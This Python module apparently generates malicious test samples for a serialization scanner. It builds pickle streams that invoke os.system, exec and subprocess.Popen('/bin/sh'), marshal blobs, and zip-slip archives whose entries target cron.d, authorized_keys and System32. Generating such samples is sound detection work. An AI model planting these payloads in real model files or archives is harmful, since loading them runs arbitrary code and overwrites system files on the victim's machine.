"""Pickle-based serialization generators: PyTorch, joblib, cloudpickle, dill, marshal."""

from __future__ import annotations

import io
import random
import struct
import zipfile


def gen_pytorch_zip(rng: random.Random) -> bytes:
    """Generate malicious PyTorch ZIP with embedded pickle."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        # Standard PyTorch structure
        zf.writestr("archive/data.pkl", b"\x80\x02cos\nsystem\n(S'id'\ntR.")
        zf.writestr("archive/data/0", b"\x00" * 16)

        # Optional: path traversal
        if rng.random() < 0.5:
            zf.writestr("../../../tmp/pwned.txt", b"PWNED")

    return buf.getvalue()


def gen_zip_slip(rng: random.Random) -> bytes:
    """Generate ZIP with path traversal entries."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        traversal_paths = [
            "../../../etc/cron.d/backdoor",
            "../../../tmp/pwned",
            "..\\..\\..\\Windows\\System32\\evil.dll",
            "archive/../../../home/user/.ssh/authorized_keys",
            "data/../../../../../../etc/passwd",
        ]
        for path in traversal_paths:
            zf.writestr(path, b"MALICIOUS CONTENT")

        # Also add symlink-like entry
        zf.writestr("symlink.txt", b"/etc/shadow")

    return buf.getvalue()


def gen_joblib_stream(rng: random.Random) -> bytes:
    """Generate joblib-like pickle stream with compressed-array markers."""
    header = rng.choice([b"\x80\x04", b"\x80\x05"])
    payload = (
        header
        + b"cjoblib.numpy_pickle\nNumpyArrayWrapper\n"
        + b"cposix\nsystem\n"
        + b"(S'id'\ntR."
        + b"ZFILE\x00"
    )
    return payload


def gen_cloudpickle_stream(rng: random.Random) -> bytes:
    """Generate cloudpickle-like stream with dynamic function globals."""
    command = rng.choice([b"id", b"cat /etc/passwd", b"curl http://127.0.0.1"])
    return (
        b"\x80\x05"
        b"ccloudpickle.cloudpickle\n_make_function\n"
        b"cbuiltins\nexec\n"
        + b"(S'__import__(\"os\").system(\""
        + command
        + b"\")'\ntR."
    )


def gen_dill_stream(rng: random.Random) -> bytes:
    """Generate dill-like stream with session/global reconstruction markers."""
    gadget = rng.choice([b"_create_function", b"_import_module", b"_load_type"])
    return (
        b"\x80\x04"
        b"cdill._dill\n"
        + gadget
        + b"\n"
        b"cos\nsystem\n"
        b"(S'id'\ntR."
    )


def gen_marshal_blob(rng: random.Random) -> bytes:
    """Generate marshal/pyc-like bytes carrying dangerous source strings."""
    timestamp = struct.pack("<II", rng.randint(0, 0xFFFFFFFF), len(b"payload"))
    return (
        b"\xa7\r\r\n"
        + timestamp
        + b"marshal\x00code\x00"
        + b"__import__('os').system('id')\x00"
        + b"subprocess.Popen('/bin/sh')\x00"
    )
